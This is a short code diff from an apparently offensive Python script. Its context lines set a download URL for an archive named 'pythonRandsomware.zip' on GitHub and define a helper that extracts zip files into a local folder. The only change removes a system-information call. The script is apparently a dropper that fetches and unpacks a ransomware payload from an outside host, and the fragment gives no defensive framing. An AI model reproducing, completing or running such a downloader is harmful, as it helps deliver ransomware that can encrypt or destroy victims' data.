@@ -20,7 +20,6 @@ def extract_zip(zip_path, extract_to):
         zip_ref.extractall(extract_to)
 
 if __name__ == "__main__":
-    system, arch = get_system_info()
     try:
         zip_url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware.zip"
         dest_folder = "downloaded_files"
